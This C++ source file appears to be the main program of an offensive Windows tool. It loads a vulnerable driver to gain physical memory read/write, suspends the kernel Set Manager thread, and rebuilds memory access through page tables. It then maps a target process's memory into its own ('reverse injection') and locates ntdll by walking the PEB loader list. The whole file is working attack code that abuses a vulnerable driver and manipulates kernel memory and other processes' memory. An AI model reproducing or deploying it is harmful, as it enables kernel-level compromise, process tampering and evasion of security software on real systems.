#include "vdm_ctx/vdm_ctx.hpp"
#include "ptm_ctx/ptm_ctx.hpp"
#include "injector_ctx/injector_ctx.hpp"
#include "set_mgr/set_mgr.hpp"

auto get_module_base(vdm::vdm_ctx* v_ctx, nasa::injector_ctx* rinjector,
	std::uint32_t pid, const wchar_t* module_name) -> std::uintptr_t
{
	const auto ppeb =
		reinterpret_cast<PPEB>(
			rinjector->translate(
				reinterpret_cast<std::uintptr_t>(v_ctx->get_peb(pid))));

	const auto ldr_data =
		reinterpret_cast<PPEB_LDR_DATA>(
			rinjector->translate(reinterpret_cast<std::uintptr_t>(ppeb->Ldr)));

	auto current_entry =
		reinterpret_cast<LIST_ENTRY*>(
			rinjector->translate(reinterpret_cast<std::uintptr_t>(
				ldr_data->InMemoryOrderModuleList.Flink)));

	while (current_entry != &ldr_data->InMemoryOrderModuleList)
	{
		const auto current_entry_data =
			reinterpret_cast<PLDR_DATA_TABLE_ENTRY>(
				reinterpret_cast<std::uintptr_t>(current_entry) - sizeof LIST_ENTRY);

		// shit looks like a stair case LMFAO?
		// need an elevator for this...
		const auto entry_module_name =
			reinterpret_cast<const wchar_t*>(
				rinjector->translate(
					reinterpret_cast<std::uintptr_t>(
						reinterpret_cast<PUNICODE_STRING>(
							reinterpret_cast<std::uintptr_t>(
								&current_entry_data->FullDllName) + sizeof UNICODE_STRING)->Buffer)));

		if (!_wcsicmp(entry_module_name, module_name))
			return rinjector->translate(
				reinterpret_cast<std::uintptr_t>(
					current_entry_data->DllBase));

		current_entry = reinterpret_cast<LIST_ENTRY*>(
			rinjector->translate(reinterpret_cast<std::uintptr_t>(current_entry->Flink)));
	}
	return {};
}

int __cdecl main(int argc, char** argv)
{
	if (argc < 3 || strcmp(argv[1], "--pid"))
	{
		std::printf("[!] please provide a process id... (--pid X)\n");
		return false;
	}

	const auto [drv_handle, drv_key] = vdm::load_drv();
	if (!drv_handle || drv_key.empty())
	{
		std::printf("[!] unable to load vulnerable driver...\n");
		return -1;
	}

	// read physical memory using the driver...
	vdm::read_phys_t _read_phys =
		[&](void* addr, void* buffer, std::size_t size) -> bool
	{
		return vdm::read_phys(addr, buffer, size);
	};

	// write physical memory using the driver...
	vdm::write_phys_t _write_phys =
		[&](void* addr, void* buffer, std::size_t size) -> bool
	{
		return vdm::write_phys(addr, buffer, size);
	};

	vdm::vdm_ctx vdm(_read_phys, _write_phys);
	ptm::ptm_ctx my_proc(&vdm);

	const auto set_mgr_pethread = set_mgr::get_setmgr_pethread(vdm);
	const auto result = set_mgr::stop_setmgr(vdm, set_mgr_pethread);

	std::printf("[+] set manager pethread -> 0x%p\n", set_mgr_pethread);
	std::printf("[+] PsSuspendThread result -> 0x%x\n", result);

	// read physical memory via paging tables and not with the driver...
	_read_phys = 
		[&my_proc](void* addr, void* buffer, std::size_t size) -> bool
	{
		return my_proc.read_phys(buffer, addr, size);
	};

	// write physical memory via paging tables and not with the driver...
	_write_phys = 
		[&my_proc](void* addr, void* buffer, std::size_t size) -> bool
	{
		return my_proc.write_phys(buffer, addr, size);
	};

	if (!vdm::unload_drv(drv_handle, drv_key))
	{
		std::printf("[!] unable to unload vulnerable driver...\n");
		return -1;
	}

	vdm.set_read(_read_phys);
	vdm.set_write(_write_phys);

	ptm::ptm_ctx target_proc(&vdm, std::atoi(argv[2]));
	nasa::injector_ctx injector(&my_proc, &target_proc);

	if (!injector.init())
	{
		std::printf("[!] failed to init injector_ctx...\n");
		return -1;
	}

	const auto ntdll_base = 
		get_module_base(&vdm, &injector,
			std::atoi(argv[2]), L"ntdll.dll");

	std::printf("[+] ntdll reverse injected base -> 0x%p\n", ntdll_base);
	std::printf("[+] ntdll reverse injected MZ -> 0x%p\n", *(short*)ntdll_base);
	std::printf("[+] press any key to close...\n");
	std::getchar();
}